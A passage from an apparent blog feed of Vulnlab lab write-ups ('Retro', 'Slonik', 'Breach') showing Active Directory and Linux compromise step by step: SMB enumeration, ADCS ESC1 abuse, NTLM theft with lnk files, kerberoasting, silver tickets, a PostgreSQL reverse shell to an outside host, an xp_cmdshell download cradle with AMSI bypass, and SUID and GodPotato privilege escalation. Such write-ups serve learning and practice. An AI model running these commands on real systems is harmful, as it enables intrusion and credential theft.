Nov  6 22:11:10 2024 -- 1 IP address (1 host up) scanned in 100.09 seconds

SMBSince we have the standard SMB open. Lets check that. Maybe we’ll get lucky.
カケス  retro-win nxc smb retro.vl -u jay -p &#x27;&#x27; --sharesSMB         10.10.93.157    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)SMB         10.10.93.157    445    DC               [+] retro.vl\jay: (Guest)SMB         10.10.93.157    445    DC               [*] Enumerated sharesSMB         10.10.93.157    445    DC               Share           Permissions     RemarkSMB         10.10.93.157    445    DC               -----           -----------     ------SMB         10.10.93.157    445    DC               ADMIN$                          Remote AdminSMB         10.10.93.157    445    DC               C$                              Default shareSMB         10.10.93.157    445    DC               IPC$            READ            Remote IPCSMB         10.10.93.157    445    DC               NETLOGON                        Logon server shareSMB         10.10.93.157    445    DC               NotesSMB         10.10.93.157    445    DC               SYSVOL                          Logon server shareSMB         10.10.93.157    445    DC               Trainees        READ

So let’s get some Trainees stuff. 😂😂

This only had one item and it read like this:

So instead of password resetting there playing minecraft. Got it!! 👍
I wanted to see, since we have guest auth, if we can get some users by bruting their rid with nxc.
カケス  retronxc smb retro.vl -u jay -p &#x27;&#x27;  --rid-bruteSMB         10.10.93.157    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)SMB         10.10.93.157    445    DC               [+] retro.vl\jay: (Guest)SMB         10.10.93.157    445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)SMB         10.10.93.157    445    DC               500: RETRO\Administrator (SidTypeUser)SMB         10.10.93.157    445    DC               501: RETRO\Guest (SidTypeUser)SMB         10.10.93.157    445    DC               502: RETRO\krbtgt (SidTypeUser)SMB         10.10.93.157    445    DC               512: RETRO\Domain Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               513: RETRO\Domain Users (SidTypeGroup)SMB         10.10.93.157    445    DC               514: RETRO\Domain Guests (SidTypeGroup)SMB         10.10.93.157    445    DC               515: RETRO\Domain Computers (SidTypeGroup)SMB         10.10.93.157    445    DC               516: RETRO\Domain Controllers (SidTypeGroup)SMB         10.10.93.157    445    DC               517: RETRO\Cert Publishers (SidTypeAlias)SMB         10.10.93.157    445    DC               518: RETRO\Schema Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)SMB         10.10.93.157    445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)SMB         10.10.93.157    445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)SMB         10.10.93.157    445    DC               525: RETRO\Protected Users (SidTypeGroup)SMB         10.10.93.157    445    DC               526: RETRO\Key Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)SMB         10.10.93.157    445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)SMB         10.10.93.157    445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)SMB         10.10.93.157    445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)SMB         10.10.93.157    445    DC               1000: RETRO\DC$ (SidTypeUser)SMB         10.10.93.157    445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)SMB         10.10.93.157    445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)SMB         10.10.93.157    445    DC               1104: RETRO\trainee (SidTypeUser)SMB         10.10.93.157    445    DC               1106: RETRO\BANKING$ (SidTypeUser)SMB         10.10.93.157    445    DC               1107: RETRO\jburley (SidTypeUser)SMB         10.10.93.157    445    DC               1108: RETRO\HelpDesk (SidTypeGroup)SMB         10.10.93.157    445    DC               1109: RETRO\tblack (SidTypeUser)
👌👌👌 Piece of Cake.
Since we got some users and Kerberos is open, LETS VALIDATE.

KERBEROSSee if we have some valid usernames proves useful.

Just one more thing I want to see, how good is this trainee password.

🤦‍♂️🤦‍♂️🤦‍♂️🤦‍♂️

SMB as traineeWell, well, well……

Guess we’re gonna look at Notes.


So this is what we saw earlier in our rid-brute for usernames. An account that must have been reset or disconnected but has the computer name BANKING$ still exists.
After doing some research on Pre-Windows 2000 we find we can use the computer name as the password lowercased and with out the trailing dollar sign. But this gives us an error.

We should change the password and see some results.


Pre-Windows 2000 and ADCSSo knowing this is possibly an older machine we can try to obtain exploit ADCS since we saw it from the nmap scan. 
With our creds from before we can try Certipy
certipy find -u trainee@retro.vl -p trainee -target retro.vl -stdout
Which does reveal a vulnerable ESC1 Template. ESC1 occurs when the person enforcing the certificate can specify its Subject Alternative Name (SAN). This option allows us to impersonate any user.
Certificate Templates  0    Template Name                       : RetroClients    Display Name                        : Retro Clients    Certificate Authorities             : retro-DC-CA    Enabled                             : True    Client Authentication               : True    Enrollment Agent                    : False    Any Purpose                         : False    Enrollee Supplies Subject           : True    Certificate Name Flag               : EnrolleeSuppliesSubject    Enrollment Flag                     : None    Private Key Flag                    : 16842752    Extended Key Usage                  : Client Authentication    Requires Manager Approval           : False    Requires Key Archival               : False    Authorized Signatures Required      : 0    Validity Period                     : 1 year    Renewal Period                      : 6 weeks    Minimum RSA Key Length              : 4096    Permissions      Enrollment Permissions        Enrollment Rights               : RETRO.VL\Domain Admins                                          RETRO.VL\Domain Computers                                          RETRO.VL\Enterprise Admins      Object Control Permissions        Owner                           : RETRO.VL\Administrator        Write Owner Principals          : RETRO.VL\Domain Admins                                          RETRO.VL\Enterprise Admins                                          RETRO.VL\Administrator        Write Dacl Principals           : RETRO.VL\Domain Admins                                          RETRO.VL\Enterprise Admins                                          RETRO.VL\Administrator        Write Property Principals       : RETRO.VL\Domain Admins                                          RETRO.VL\Enterprise Admins                                          RETRO.VL\Administrator    [!] Vulnerabilities      ESC1                              : &#x27;RETRO.VL\\Domain Computers&#x27; can enroll, enrollee supplies subject and template allows client authentication

Since we have a computer that was forgot about and we changed the creds, we’ll use that one.
BANKING$:Password123!

We impersonate
Our first request wasn’t successful. Reason seems to be the KEY_LENGTH.

Let’s adjust the key size and try again.

And now we use it to authenticate and recieve the admin hash.
カケス  retro-win certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.10.90.201Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: administrator@retro.vl[*] Trying to get TGT...[*] Got TGT[*] Saved credential cache to &#x27;administrator.ccache&#x27;[*] Trying to retrieve NT hash for &#x27;administrator&#x27;[*] Got hash for &#x27;administrator@retro.vl&#x27;: &lt;SNIP&gt;:&lt;SNIP&gt;


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>ADCS</tag>
        <tag>Pre-Windows 2000</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>Slonik (Linux Medium)</title>
    <url>/2024/12/04/Slonik/</url>
    <content><![CDATA[
Slonik is a linux box created around reusing a socket and the ability to port forward them. It starts with a box running NFS, and using showmount our able to see two. There is /var/backups, and /home. Home was interesting, with there being a .bash_history and a .psql_history to see that we have commands previously ran. Using rpcinfo you can see we have sockets being used. From the information we have we can create a directory /tmp/sock and us it and the ending pid in the .bash_history. Using ssh we can connect using the socket created by postgres. Once connected we can get a reverse shell using a POC from hacktricks. Once getting a shell, we run pspy64 to see a script running from cron /usr/bin/backup. This script will back up everything postgres HOME directory. By copying /usr/bin/bash to our HOME directory in main. Then giving it the sticky bit and making it executable we can get root.
Initial NmapPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 63111/tcp  open  rpcbind syn-ack ttl 632049/tcp open  nfs     syn-ack ttl 63
NFSShowing the mounts available on the machine.
$ showmount -e 10.10.104.168Export list for 10.10.104.168:/var/backups */home        *

Mounting the file share.
$ mkdir nfs$ mount -t nfs 10.10.104.168:/home ./nfs -o nolock$ ls -lsatotal 124 drwxr-xr-x 3 root root 4096 Oct 24  2023 .4 drwxr-xr-x 5 root root 4096 Dec  4 02:46 ..4 drwxr-x--- 5 1337 1337 4096 Oct 24  2023 service
Seeing the UUID being 1337 we can create a user with the specific UUID:
$ useradd -u 1337 -m -s /bin/bash slonik$ su slonik*To Remove*$ userdel -f slonik$ rm -rf /home/slonik

Then we can look into the directory and see .bash_history and .psql_history(PostgreSQL).
$ su slonik┌──(slonik㉿megabyte)-[/root/Documents/vulnlab/machines/slonik/nfs/service]└─$ ls -lsatotal 404 drwxr-x--- 5 slonik slonik 4096 Oct 24  2023 .4 drwxr-xr-x 3 root   root   4096 Oct 24  2023 ..4 -rw-rw-r-- 1 slonik slonik   90 Oct 24  2023 .bash_history4 -rw-r--r-- 1 slonik slonik  220 Oct 24  2023 .bash_logout4 -rw-r--r-- 1 slonik slonik 3771 Oct 24  2023 .bashrc4 drwx------ 2 slonik slonik 4096 Oct 24  2023 .cache4 drwxrwxr-x 3 slonik slonik 4096 Oct 24  2023 .local4 -rw-r--r-- 1 slonik slonik  807 Oct 24  2023 .profile4 -rw------- 1 slonik slonik  326 Oct 24  2023 .psql_history4 drwxrwxr-x 2 slonik slonik 4096 Oct 24  2023 .ssh

Reading these shows the user and the socket being used.
cat .bash_historyls -lah /var/run/postgresql/file /var/run/postgresql/.s.PGSQL.5432psql -U postgresexit
This MD5 hash cracks to service.
$ cat .psql_historyCREATE DATABASE service;\c service;CREATE TABLE users ( id SERIAL PRIMARY KEY, username VARCHAR(255) NOT NULL, password VARCHAR(255) NOT NULL, description TEXT);INSERT INTO users (username, password, description)VALUES (&#x27;service&#x27;, &#x27;aaabf0d39951f3e6c3e8a7911df5000&#x27;WHERE&#x27;, network access account&#x27;);select * from users;\q

We run rpcinfo and check sockets being ran.
$ rpcinfo 10.10.104.168   program version netid     address                service    owner    100000    4    tcp6      ::.0.111               portmapper superuser    100000    3    tcp6      ::.0.111               portmapper superuser    100000    4    udp6      ::.0.111               portmapper superuser    100000    3    udp6      ::.0.111               portmapper superuser    100000    4    tcp       0.0.0.0.0.111          portmapper superuser    100000    3    tcp       0.0.0.0.0.111          portmapper superuser    100000    2    tcp       0.0.0.0.0.111          portmapper superuser    100000    4    udp       0.0.0.0.0.111          portmapper superuser    100000    3    udp       0.0.0.0.0.111          portmapper superuser    100000    2    udp       0.0.0.0.0.111          portmapper superuser    100000    4    local     /run/rpcbind.sock      portmapper superuser    100000    3    local     /run/rpcbind.sock      portmapper superuser    100005    1    udp       0.0.0.0.183.239        mountd     superuser    100005    1    tcp       0.0.0.0.236.31         mountd     superuser    100005    1    udp6      ::.173.122             mountd     superuser    100005    1    tcp6      ::.235.129             mountd     superuser    100005    2    udp       0.0.0.0.157.229        mountd     superuser    100005    2    tcp       0.0.0.0.219.35         mountd     superuser    100005    2    udp6      ::.197.65              mountd     superuser    100005    2    tcp6      ::.141.93              mountd     superuser    100005    3    udp       0.0.0.0.169.233        mountd     superuser    100005    3    tcp       0.0.0.0.190.141        mountd     superuser    100024    1    udp       0.0.0.0.205.52         status     117    100024    1    tcp       0.0.0.0.209.81         status     117    100005    3    udp6      ::.234.209             mountd     superuser    100005    3    tcp6      ::.184.3               mountd     superuser    100024    1    udp6      ::.206.243             status     117    100024    1    tcp6      ::.148.215             status     117    100003    3    tcp       0.0.0.0.8.1            nfs        superuser    100003    4    tcp       0.0.0.0.8.1            nfs        superuser    100227    3    tcp       0.0.0.0.8.1            nfs_acl    superuser    100003    3    tcp6      ::.8.1                 nfs        superuser    100003    4    tcp6      ::.8.1                 nfs        superuser    100227    3    tcp6      ::.8.1                 nfs_acl    superuser    100021    1    udp       0.0.0.0.224.12         nlockmgr   superuser    100021    3    udp       0.0.0.0.224.12         nlockmgr   superuser    100021    4    udp       0.0.0.0.224.12         nlockmgr   superuser    100021    1    tcp       0.0.0.0.145.209        nlockmgr   superuser    100021    3    tcp       0.0.0.0.145.209        nlockmgr   superuser    100021    4    tcp       0.0.0.0.145.209        nlockmgr   superuser    100021    1    udp6      ::.178.32              nlockmgr   superuser    100021    3    udp6      ::.178.32              nlockmgr   superuser    100021    4    udp6      ::.178.32              nlockmgr   superuser    100021    1    tcp6      ::.154.187             nlockmgr   superuser    100021    3    tcp6      ::.154.187             nlockmgr   superuser    100021    4    tcp6      ::.154.187             nlockmgr   superuser

Using the information we’ve gathered:

file /var/run/postgresql/.s.PGSQL.5432
username: service | password: 

We can create a temp socket on our /tmp directory and connect with the PGSQL id.
$ mkdir /tmp/sock$ ssh -L /tmp/sock/.s.PGSQL.5432:/var/run/postgresql/.s.PGSQL.5432 service@10.10.104.168 -N -T

Shell as postgresOnce we have our forward setup we can access psql on the box. Then we can get our reverse shell.
$ psql -h /tmp/sock/ -U postgrespsql (17.0 (Debian 17.0-1+b2), server 14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))Type &quot;help&quot; for help.postgres=# DROP TABLE IF EXISTS cmd_exec;DROP TABLEpostgres=# CREATE TABLE cmd_exec(cmd_output text);CREATE TABLEpostgres=# COPY cmd_exec FROM PROGRAM &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.8.4.29/80 0&gt;&amp;1&quot;&#x27;;

If we look on the box using pspy64 we will see a process running every 1min. This file being /usr/bin/backup and if we read the file we can grasp what it’s doing.
#!/bin/bashdate=$(/usr/bin/date +&quot;%FT%H%M&quot;)/usr/bin/rm -rf /opt/backups/current/*/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current//usr/bin/zip -r &quot;/var/backups/archive-$date.zip&quot; /opt/backups/current/count=$(/usr/bin/find &quot;/var/backups/&quot; -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)if [ &quot;$count&quot; -gt 10 ]; then  /usr/bin/rm -rf /var/backups/*fi
PrivEscWe know this file is using pg_basebackup, which backs up the postgres HOME directory. Then this gets backed up to /opt/backups/current/. This running as root, we can copy bash to our current folder /var/lib/postgresql/14/main, then set the SUID bit as well as making it executable.
postgres@slonik:/var/lib/postgresql/14/main$ cp /usr/bin/bash bashpostgres@slonik:/var/lib/postgresql/14/main$ chmod u+s bashpostgres@slonik:/var/lib/postgresql/14/main$ chmod +x bash
postgres@slonik:/opt/backups/current$./bash -pbash# iduid=0(root) gid=0(root) groups=0(root)


]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>NFS</tag>
        <tag>SUID HiJacking</tag>
        <tag>PostgreSQL RCE</tag>
        <tag>bash SUID File Copy</tag>
      </tags>
  </entry>
  <entry>
    <title>Breach (Windows Medium)</title>
    <url>/2025/03/28/Breach/</url>
    <content><![CDATA[
Breach is a Windows Medium box that starts with Guest auth to shares. Having read&#x2F;write to one share, we upload a lnk file and receive a user hash. This hash is used to kerberoast SPNs which gets a hash for svc_mssql user. As we have a Service Account, we can create a silver ticket. After creation, we connect as Administrator to a MSSQL instance and can run commands via xp_cmdshell. Only after bypassing AMSI do you get a reverse shell. Once on the machine, checking our privileges we have SeImpersonate available to us. Using GodPotato we create a user and add them to the Administrators group, and connect as Admin via evil-winrm.
Initial NmapPORT     STATE SERVICE       REASON          VERSION53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.088/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 00:08:14Z)135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)445/tcp  open  microsoft-ds? syn-ack ttl 127464/tcp  open  kpasswd5?     syn-ack ttl 127593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0636/tcp  open  tcpwrapped    syn-ack ttl 1271433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.20003268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)3269/tcp open  tcpwrapped    syn-ack ttl 1273389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal ServicesService Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

SMBTrying as Guest allows us access to the share on the DC.
$ nxc smb 10.10.92.126 -u Guest -p &#x27;&#x27; --sharesSMB         10.10.92.126    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)SMB         10.10.92.126    445    BREACHDC         [+] breach.vl\Guest: SMB         10.10.92.126    445    BREACHDC         [*] Enumerated sharesSMB         10.10.92.126    445    BREACHDC         Share           Permissions     RemarkSMB         10.10.92.126    445    BREACHDC         -----           -----------     ------SMB         10.10.92.126    445    BREACHDC         ADMIN$                          Remote AdminSMB         10.10.92.126    445    BREACHDC         C$                              Default shareSMB         10.10.92.126    445    BREACHDC         IPC$            READ            Remote IPCSMB         10.10.92.126    445    BREACHDC         NETLOGON                        Logon server share SMB         10.10.92.126    445    BREACHDC         share           READ,WRITE      SMB         10.10.92.126    445    BREACHDC         SYSVOL                          Logon server share SMB         10.10.92.126    445    BREACHDC         Users           READ 
We have read&#x2F;write to the share. Looking over it we see some directories we can access.
smbmap -u Guest -p &#x27;&#x27; -d breach.vl -H 10.10.92.126 -R share[+] IP: 10.10.92.126:445        Name: breachdc.breach.vl                                        Disk                                                    Permissions     Comment        ----                                                    -----------     -------        share                                                   READ, WRITE        .\share\*        dr--r--r--                0 Thu Mar 27 19:29:56 2025    .        dr--r--r--                0 Thu Feb 17 09:38:00 2022    ..        dr--r--r--                0 Thu Mar 27 19:25:05 2025    finance        dr--r--r--                0 Thu Feb 17 05:19:13 2022    software        dr--r--r--                0 Thu Mar 27 19:25:26 2025    transfer        .\share\finance\*        dr--r--r--                0 Thu Mar 27 19:25:05 2025    .        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..        .\share\software\*        dr--r--r--                0 Thu Mar 27 19:25:17 2025    .        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..        .\share\transfer\*        dr--r--r--                0 Thu Mar 27 19:25:26 2025    .        dr--r--r--                0 Thu Mar 27 19:29:56 2025    ..        dr--r--r--                0 Thu Feb 17 05:23:51 2022    claire.pope        dr--r--r--                0 Thu Feb 17 05:23:22 2022    diana.pope        dr--r--r--                0 Thu Feb 17 05:24:39 2022    julia.wong

NTLM TheftWe can drop and scf or lnk file and see if we can any clicks.
$ python3 ntlm_theft.py --generate lnk --server 10.8.4.29 --filename freeCandyCreated: freeCandy/freeCandy.lnk (BROWSE TO FOLDER)Generation Complete.$ impacket-smbclient &#x27;breach.vl/Guest@breach.vl&#x27; -no-passImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies Type help for list of commands# shares                                                   ADMIN$                                                     C$                                                         IPC$                                                       NETLOGON                                                   share                                                      SYSVOL                                                     Users                                                      # use share                                                # ls                                                       drw-rw-rw-          0  Fri Mar 28 08:16:30 2025 .drw-rw-rw-          0  Thu Feb 17 09:38:00 2022 ..drw-rw-rw-          0  Thu Feb 17 05:19:36 2022 financedrw-rw-rw-          0  Thu Feb 17 05:19:13 2022 softwaredrw-rw-rw-          0  Thu Feb 17 08:00:35 2022 transfer# cd transfer                                              # ls                                                       drw-rw-rw-          0  Thu Feb 17 08:00:35 2022 .drw-rw-rw-          0  Fri Mar 28 08:16:30 2025 ..drw-rw-rw-          0  Thu Feb 17 05:23:51 2022 claire.pope drw-rw-rw-          0  Thu Feb 17 05:23:22 2022 diana.popedrw-rw-rw-          0  Thu Feb 17 05:24:39 2022 julia.wong# put freeCandy.lnk                                        # exit
And we can put it in the transfer folder where the users are at. After we setup responder and see if we get a hit.
$ sudo responder -I tun0[+] Listening for events...[SMB] NTLMv2-SSP Client   : 10.10.92.126[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:0526add1eaef5104:1DD6932CED548FA48BD4BED2516A3E02:01010000000000008061771E4D9FDB018B3185DF3D296F610000000002000800570041004100560001001E00570049004E002D00360042003100300033004F00470059004D004B&lt;SNIP&gt;[*] Skipping previously captured hash for BREACH\Julia.Wong 
Once cracked, we can get a dump for bloodhound. After getting a list of users.
$ nxc smb breach.vl -u julia.wong -p &lt;SNIP&gt; --rid-brute | grep SidTypeUser | cut -d &#x27;\&#x27; -f2 | awk &#x27;&#123;print $1&#125;&#x27; &gt; users.list

KerberoastingFollowing general rule of thumb, when we have credentials we try kerberoasting. We can see if we have any SPNs associated with this user.
$ GetUserSPNs.py &#x27;breach.vl/julia.wong:&lt;SNIP&gt;&#x27;         Impacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation --------------------------------  ---------  --------  --------------------------  --------------------------  ----------MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2025-03-28 08:08:15.526819             $ GetUserSPNs.py &#x27;breach.vl/julia.wong:&lt;SNIP&gt;&#x27; -request-user svc_mssqlImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation --------------------------------  ---------  --------  --------------------------  --------------------------  ----------MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 04:43:08.106169  2025-03-28 08:08:15.526819             [-] CCache file is not found. Skipping...$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$94460cab00e138498318d889ae9d858d$ebfbc9219ec245123242aa4a3b5408c548d7dd7afb1926b61936c422b74fed99f0414f59d3cad89f18afc227c4d0275048a11c91816eae8248d9fa69e1f30ccb77b76020f07ea4452f2af9352e1817f92a9758a4099e76402df858ecb54abb9f170179107dff4fb442b7a5437a348476398b0459&lt;SNIP&gt;
And we get a hit on svc_mssql, when we crack the hash we get a clear text cred we can use against the open port 1433&#x2F;mssql.
Silver Ticket AttackSince we have valid credentials to a service account(MSSQL). We can create a silver ticket which will give us administrative rights when we connect to the mssql instance. If we did it now we wouldn’t have the ability to run commands. 
$ impacket-mssqlclient &#x27;breach.vl/svc_mssql:&lt;SNIP&gt;@breach.vl&#x27; -windows-authImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL (BREACH\svc_mssql  guest@master)&gt; enable_xp_cmdshellERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.ERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.SQL (BREACH\svc_mssql  guest@master)&gt;
So we use impacket-ticketer to create our ticket. First we need to convert the password to a nthash with a converter online. Then we must get the domain sid. We can obtain that a couple of ways, using impacket tools such as lookupsid, getPac, nxc, bloodhound data. Then we create our ticket. Ensure to use // when entering the service or you will get an error when kerberos looks for the ticket. This is in some cases, at least it was for me
$ impacket-getPac &#x27;breach.vl/svc_mssql:&lt;SNIP&gt;&#x27; -targetUser &#x27;svc_mssql&#x27;&lt;SNIP&gt;ResourceGroupDomainSid:          NULL           ResourceGroupCount:              0                                                                                    ResourceGroupIds:                NULL                                                                                 Domain SID: S-1-5-21-2330692793-3312915120-706255856 $ impacket-ticketer -nthash &#x27;0006C7AA1E800E17F8E78870E2000&#x27; -spn &#x27;MSSQLSvc//breachdc.breach.vl:1433&#x27; -domain &#x27;breach.vl&#x27; -domain-sid &#x27;S-1-5-21-2330692793-3312915120-706255856&#x27; -user-id &#x27;500&#x27; AdministratorImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies                                                            [*] Creating basic skeleton ticket and PAC Infos [*] Customizing ticket for breach.vl/Administrator[*] PAC_LOGON_INFO [*]     PAC_CLIENT_INFO_TYPE[*]     EncTicketPart[*]     EncTGSRepPart                                [*] Signing/Encrypting final ticket    [*]     PAC_SERVER_CHECKSUM                             [*]     PAC_PRIVSVR_CHECKSUM[*]     EncTicketPart[*]     EncTGSRepPart[*] Saving ticket in Administrator.ccache
After creation, we can export it and connect using kerberos.
$ export KRB5CCNAME=Administrator.ccache$ impacket-mssqlclient -dc-ip 10.10.112.98 -k -no-pass &#x27;breach.vl/Administrator@breach.vl&#x27; -windows-auth -debugImpacket v0.13.0.dev0+20241024.90011.835e1755 - Copyright Fortra, LLC and its affiliated companies [+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.13.0.dev0+20241024.90011.835e1755-py3.11.egg/impacket[*] Encryption required, switching to TLS[+] Using Kerberos Cache: Administrator.ccache [+] SPN MSSQLSVC/:1433@BREACH.VL not found in cache       [+] AnySPN is True, looking for another suitable SPN   [+] Returning cached credential for MSSQLSVC/@BREACH.VL  [+] Using TGS from cache                                  [+] Changing sname from MSSQLSvc/@BREACH.VL to MSSQLSVC/:1433@BREACH.VL and hoping for the best[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commandsSQL (BREACH\Administrator  dbo@master)&gt; 
Now we can run a commands. After enabling xp_cmdshell we run the following with our listener up:
SQL (BREACH\Administrator  dbo@master)&gt; xp_cmdshell echo IEX((New-Object Net.WebClient).DownloadString(&quot;http://10.8.4.29/a2.ps1&quot;)) | powershell -noprofile---$ sudo python3 -m http.server 80                 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.112.98 - - [28/Mar/2025 11:16:18] &quot;GET /a2.ps1 HTTP/1.1&quot; 200 -10.10.112.98 - - [28/Mar/2025 11:16:58] &quot;GET /cradle.ps1 HTTP/1.1&quot; 200 -10.10.112.98 - - [28/Mar/2025 11:16:59] &quot;GET /sm.ps1 HTTP/1.1&quot; 200 -

a2.ps1 is a AMSI-Bypass tha once finished will reach out again for the cradle.ps1
cradle.ps1 will reach out again for the reverse shell.
sm.ps1 is the full reverse shell. Nishang Oneliner.

This get us a reverse shell. Finally!!
PrivEsc$ rlwrap nc -lvnp 9002                                                                           listening on [any]9002 ...connect to [10.8.4.29] from (UNKNOWN) [10.10.112.98]58767PS C:\Windows\system32&gt; cd \programdataPS C:\programdata&gt; ls
After looking at our privileges we can see our easy out.
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled SeImpersonatePrivilege        Impersonate a client after authentication Enabled SeCreateGlobalPrivilege       Create global objects                     Enabled 
Transfered GodPotato over and created a user and added them to the Administrators group.
PS C:\programdata&gt; .\GP.exe -cmd &quot;cmd /c net user das Password123! /add &amp;&amp; net localgroup Administrators das /add&quot;[*] CombaseModule: 0x140728437833728[*] DispatchTable: 0x140728440424312[*] UseProtseqFunction: 0x140728439716656[*] UseProtseqFunctionParamCount: 6[*] HookRPC[*] Start PipeServer[*] CreateNamedPipe \\.\pipe\3d715370-aea5-445c-99d8-44b10fe45380\pipe\epmapper[*] Trigger RPCSS[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046[*] DCOM obj IPID: 0000a002-020c-ffff-8d0d-32b15ac3e33c[*] DCOM obj OXID: 0x5accc6eeede9cc5[*] DCOM obj OID: 0x3ea5b1981acb83fd[*] DCOM obj Flags: 0x281[*] DCOM obj PublicRefs: 0x0[*] Marshal Object bytes len: 100[*] UnMarshal Object[*] Pipe Connected![*] CurrentUser: NT AUTHORITY\NETWORK SERVICE[*] CurrentsImpersonationLevel: Impersonation[*] Start Search System Token[*] PID : 104 Token:0x756  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation[*] Find System Token : True[*] UnmarshalObject: 0x80070776[*] CurrentUser: NT AUTHORITY\SYSTEM[*] process start with pid 2084The command completed successfully.The command completed successfully.
Lets get on the system.
$ evil-winrm -i breach.vl -u das -p &#x27;Password123!&#x27;Evil-WinRM shell v3.5                                                            Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\das\Documents&gt; whoami /all&lt;SNIP&gt;BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner&lt;SNIP&gt;

]]></content>
      <categories>
        <category>vl</category>
      </categories>
      <tags>
        <tag>ntlm theft</tag>
        <tag>kerberoasting SPNs</tag>
        <tag>silver ticket</tag>
        <tag>mssql</tag>
        <tag>amsi-bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Cascade (Windows Medium)</title>
    <url>/2025/03/05/Cascade/</url>
    <content><![CDATA[
